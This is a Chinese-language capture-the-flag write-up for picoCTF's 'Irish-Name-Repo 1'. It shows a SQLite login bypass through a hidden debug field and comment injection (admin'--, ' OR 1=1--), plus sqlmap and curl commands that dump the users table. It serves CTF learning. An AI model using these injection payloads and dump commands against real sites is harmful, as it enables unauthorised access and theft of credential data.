# WP｜picoCTF 2019 Irish-Name-Repo 1：SQLite 登录绕过 + debug 回显

- **题目**：Irish-Name-Repo 1（Web Exploitation, 300 pts），本次实例 `http://fickle-tempest.picoctf.net:59366/login.php`
- **类型**：SQL 注入 → 登录绕过（后端 SQLite，布尔/报错/时间三种盲注）
- **最终 flag**：`picoCTF{s0m3_SQL_85832275}`

---

## 0. 侦察结论

| 项 | 值 |
|---|---|
| 页面 | "List 'o the Irish!" 名人主页，侧边菜单有 Support / **Admin Login** 两个入口 |
| 登录页 | `login.html` → 表单 POST 到 `login.php` |
| 提交方式 | POST，字段 `username`、`password` + 一个隐藏字段 **`debug=0`** |
| 注入点 | `username` 参数 |
| 注入类型 | boolean-based blind + error-based + time-based blind（sqlmap 实测） |
| 后端 | **SQLite**（Debian 10 + Apache + PHP 7.2） |
| 回显开关 | `debug=1` 时页面直接打印 SQL 查询语句 ← 本题最大突破口 |

后端拼的 SQL 是：
```sql
SELECT * FROM users WHERE name='$u' AND password='$p'
```

---

## 1. 最快解法：debug 开卷 + 注释绕过（1 秒出 flag）

### Step 1：发现隐藏的 debug 参数
登录页 HTML 里藏着：
```html
<input type="hidden" name="debug" value="0">
```
改成 `1` 提交，页面顶部多出一段：
```html
<pre>SQL query: SELECT * FROM users WHERE name='admin' AND password='password'</pre>
```
**等于开卷考**——SQL 拼法直接给你看，不用猜过滤逻辑。

### Step 2：注释绕过
```
POST /login.php
username=admin'--
password=任意
```
SQL 变成：
```sql
SELECT * FROM users WHERE name='admin'--' AND password='x'
```
`--` 在 SQLite 里是行尾注释，`' AND password='x'` 整段被吞掉 → 返回：

```html
<h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_85832275}</p>
```

变体 `username=' OR 1=1--` 同样成立（让 WHERE 恒真，落到第一行用户）。

> ⚠️ **MySQL vs SQLite 注释差异**：MySQL 的 `--` 后面**必须跟一个空格/控制符**（写成 `-- -` 或 `-- `），否则不生效；**SQLite 的 `--` 到行尾都是注释**，`admin'--` 裸写就行。这是这题能一把梭的原因之一。

---

## 2. sqlmap 完整流程（与 qsnctf 40517 对照）

入口：`C:\Users\Hong\Desktop\ctf_tools\web_tools\sqlmap-master\sqlmap.py`（必加 `--batch`）

### 检测 + 列表
```bash
python sqlmap.py -u "http://fickle-tempest.picoctf.net:59366/login.php" \
  --data="username=admin&password=password" --batch --tables
```
结果：
- `username` 命中三种注入：布尔盲注（SQLite JSON）、error-based、time-based blind
- DBMS = **SQLite**；枚举到唯一表 `users`

### dump users 表
```bash
python sqlmap.py -u "URL" --data="username=admin&password=password" \
  --batch -D SQLite_masterdb -T users --dump
```
```
Table: users
| name  | admin | password |
| admin | 1     | pbkdf2:sha1:1000$bTY1abU0$5503... |
```
密码是 Python Werkzeug 的 PBKDF2 哈希（强哈希，别想爆破），**表里根本没有 flag**。

---

## 3. ⚠️ 核心教训：库空 → 出口在业务逻辑页

对照两道同构题：

| | qsnctf 40517 | picoCTF Irish-Name-Repo 1 |
|---|---|---|
| 后端 | MySQL | SQLite |
| 库里有没有 flag | 有，但**是假 flag 诱饵** | **根本没有 flag 表** |
| 真 flag 在哪 | 登录成功跳转的 `admin.php` | 登录成功的**响应正文** |
| 结论 | 拖库 ≠ 拿真 flag | 拖库 ≈ 白忙，转人工 |

两条路殊途同归，一条铁律：

1. **拖库 ≠ 拿到真 flag**。要么库里有诱饵（假 flag），要么库里压根没有——flag 通常挂在"登录成功 / 命令执行 / 文件读取"这类业务出口上。
2. **sqlmap 干完侦察后必须人脑判断方向**：看到库里没货，立即停手，回去看页面逻辑。
3. **HTML 隐藏字段别跳过**：`debug`/`test`/`admin` 这类 hidden input 是出题人留的调试口，改值回显查询 = 降维打击。
4. time-based 盲注会让靶机短暂假死（heavy query），sqlmap 报 `unable to connect` 别慌，是注入生效的正常现象。

---

## 4. 本题学到的 5 件事

1. 先翻登录页 HTML：隐藏字段（尤其 `debug`）可能直接回显 SQL。
2. SQLite 注释：`--` 到行尾生效，无需 MySQL 的 `-- -` 空格写法。
3. `admin'--` = 只进 admin 账号；`' OR 1=1--` = 取第一行用户，效果有细微差别。
4. sqlmap 四步链（dbs→tables→columns→dump）在 SQLite 上同样适用，但表少不等于没戏，方向要人定。
5. Werkzeug 的 `pbkdf2:sha1:1000$...` 哈希强到没必要爆破，绕过登录永远比破解快。

---

## 5. 速查：本题两条命令模板

```bash
# sqlmap 检测 + 列表（POST 注入必带 --data）
sqlmap.py -u "URL/login.php" --data="username=admin&password=password" --batch --tables

# dump 指定表
sqlmap.py -u "URL/login.php" --data="username=admin&password=password" --batch -D SQLite_masterdb -T users --dump

# 人工绕过（更快，出 flag 的正路）
curl -X POST URL/login.php --data-urlencode "username=admin'--" --data "password=x&debug=1"
```
